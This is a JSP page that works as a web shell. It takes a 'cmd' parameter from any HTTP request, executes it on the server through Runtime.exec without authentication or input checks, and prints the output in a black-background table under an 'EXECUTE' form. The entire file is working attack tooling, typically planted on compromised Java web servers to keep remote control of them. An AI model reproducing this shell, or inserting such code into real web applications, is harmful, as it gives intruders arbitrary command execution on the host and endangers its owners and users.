<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="java.io.*" %>
<%
request.setCharacterEncoding("UTF-8");
%>

<%
String cmd = request.getParameter("cmd");
Process ps = null;
BufferedReader br = null;
String line = "";
String result = "";
String now_page = request.getServletPath();

try{
	if(cmd != null){
	ps = Runtime.getRuntime().exec(cmd);
	br = new BufferedReader(new InputStreamReader(ps.getInputStream()));

	while((line = br.readLine()) != null){
		result += line + "<br>";
	}
	ps.destroy();
	}
} finally{
	if(br != null) br.close();
}
%>

<form action="<%=now_page%>" method="POST">
<input type="text" name="cmd">
<input type="submit" value="EXECUTE">
</form>
<hr>
<% if(cmd != null){ %>
<table style="border: 1px solid black; background-color: black"
<tr>
	<td style="color: white; font-size: 12px"><%=result%></td>
</tr>
</table>
<% }%>